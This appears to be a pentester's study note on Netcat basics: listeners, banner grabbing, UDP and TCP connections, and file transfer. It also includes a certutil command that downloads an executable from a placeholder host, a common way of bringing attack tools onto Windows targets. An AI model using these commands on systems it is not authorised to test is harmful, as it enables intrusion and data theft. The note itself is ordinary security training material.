# Netcat Fundamentals

- Netcat is a network utility used to read and write data to network connection using TCP and UDP
- It is available on both Linux and Windows
- It utilizes a client-server communication architecture with two modes:
	- Client mode: used to connect to any TCP/UDP port
	- Server mode: used to listen for connections for clients on a specific port
- Netcat is used by pentesters to do the following:
	- banner grabbing
	- port scanning
	- transferring files
	- bind/reverse shells

## Demonstration

```bash
# banner grabbing
$ nc -nv <ip> <port>
# setup a listener (TCP)
$ nc -lvnp <port>
# connect to listener (TCP)
$ nc.exe -nv <ip> <port>
# setup a listener (UDP)
$ nc -lvnup <port>
# connect to listener (UDP)
$ nc.exe -nvu <ip> <port>
```

```bash
# kali windows executables
$ ls al /usr/share/windows-binaries
# transfer it
$ certutil -urlcache -f http://<ip>/<exe> <exe>
```

How to transfer files with netcat:

```bash
# listener
>nc.exe -lvnp <port> > test.txt
# connect to
$ nc -nv <ip> <port> < test.txt
```
